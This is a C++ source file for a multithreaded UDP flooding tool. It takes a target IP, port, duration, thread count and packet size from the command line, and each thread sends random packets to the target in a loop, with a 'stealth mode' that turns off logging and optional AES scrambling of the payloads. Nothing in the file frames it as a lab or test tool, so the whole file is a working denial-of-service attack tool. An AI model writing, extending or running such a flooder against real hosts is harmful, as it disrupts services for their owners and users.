#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <fstream>
#include <mutex>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/aes.h>

// Constants
const int MAX_PAYLOAD_SIZE = 1024;
const bool DEFAULT_STEALTH_MODE = false; // Default stealth mode
const bool DEFAULT_ENCRYPT = false; // Default encryption mode

// Function prototypes
void sendPackets(const std::string &targetIP, int targetPort, int threadID, int packetSize, int duration, bool encrypt, bool stealthMode);
void logPacket(const std::string &status, const std::vector<uint8_t> &packet, int threadID, bool stealthMode);
std::vector<uint8_t> generatePayload(int size, bool encrypt);

// Mutex for thread-safe logging
std::mutex logMutex;

int main(int argc, char *argv[]) {
    if (argc < 6) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port> <duration_seconds> <thread_count> <packet_size>" << std::endl;
        return 1;
    }

    std::string targetIP = argv[1];
    int targetPort = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threadCount = std::stoi(argv[4]);
    int packetSize = std::stoi(argv[5]);

    bool stealthMode = DEFAULT_STEALTH_MODE;
    bool encrypt = DEFAULT_ENCRYPT;

    std::vector<std::thread> threads;

    for (int i = 0; i < threadCount; ++i) {
        threads.emplace_back(sendPackets, std::ref(targetIP), targetPort, i, packetSize, duration, encrypt, stealthMode);
    }

    for (auto &thread : threads) {
        thread.join();
    }

    return 0;
}

void sendPackets(const std::string &targetIP, int targetPort, int threadID, int packetSize, int duration, bool encrypt, bool stealthMode) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "Socket creation error" << std::endl;
        return;
    }

    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(targetPort);
    inet_pton(AF_INET, targetIP.c_str(), &servaddr.sin_addr);

    auto start = std::chrono::high_resolution_clock::now();

    while (true) {
        auto now = std::chrono::high_resolution_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start);

        if (elapsed.count() >= duration) {
            break;
        }

        std::vector<uint8_t> payload = generatePayload(packetSize, encrypt);
        sendto(sock, payload.data(), payload.size(), 0, (const struct sockaddr *)&servaddr, sizeof(servaddr));

        if (!stealthMode) {
            logPacket("Sent", payload, threadID, stealthMode);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Adjust sleep time as needed
    }

    close(sock);
}

void logPacket(const std::string &status, const std::vector<uint8_t> &packet, int threadID, bool stealthMode) {
    if (stealthMode) return;

    std::lock_guard<std::mutex> guard(logMutex);
    std::ofstream logFile("packet_log.csv", std::ios::app);

    auto now = std::chrono::system_clock::now();
    auto now_time_t = std::chrono::system_clock::to_time_t(now);
    auto now_tm = *std::localtime(&now_time_t);

    logFile << now_tm.tm_year + 1900 << '-'
            << now_tm.tm_mon + 1 << '-'
            << now_tm.tm_mday << ' '
            << now_tm.tm_hour << ':'
            << now_tm.tm_min << ':'
            << now_tm.tm_sec << ',';

    logFile << status << "," << threadID << ",";

    for (const auto &byte : packet) {
        logFile << std::hex << static_cast<int>(byte);
    }

    logFile << std::endl;
}

std::vector<uint8_t> generatePayload(int size, bool encrypt) {
    std::vector<uint8_t> payload(size);
    for (int i = 0; i < size; ++i) {
        payload[i] = rand() % 256;
    }

    if (encrypt) {
        // Example AES encryption (requires proper key management)
        AES_KEY enc_key;
        uint8_t key[] = "0123456789abcdef"; // Example key
        AES_set_encrypt_key(key, 128, &enc_key);
        AES_encrypt(payload.data(), payload.data(), &enc_key);
    }

    return payload;
}
